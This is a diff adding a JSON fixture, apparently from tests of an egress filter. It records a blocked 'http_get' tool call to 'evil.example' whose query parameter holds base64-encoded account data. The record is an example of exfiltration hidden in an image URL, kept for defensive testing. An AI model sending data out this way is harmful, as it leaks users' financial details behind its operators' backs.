@@ -1,0 +1,30 @@
+{
+  "endpoint": "POST /egress",
+  "status": 403,
+  "request": {
+    "tool": "http_get",
+    "target": "https://evil.example/p.png?d=Q1o2NTA4MDAwMDAwMTkyMDAwMTQ1Mzk5",
+    "content": ""
+  },
+  "response": {
+    "error": "egress_blocked",
+    "message": "data in URL",
+    "details": {
+      "decision": {
+        "decision": "block",
+        "rule_ids": [
+          "E-ALLOWLIST",
+          "E-ENCODED",
+          "E-URLDATA"
+        ],
+        "findings": [
+          {
+            "rule_id": "E-URLDATA",
+            "detail": "query parameter d",
+            "count": 1
+          }
+        ]
+      }
+    }
+  }
+}
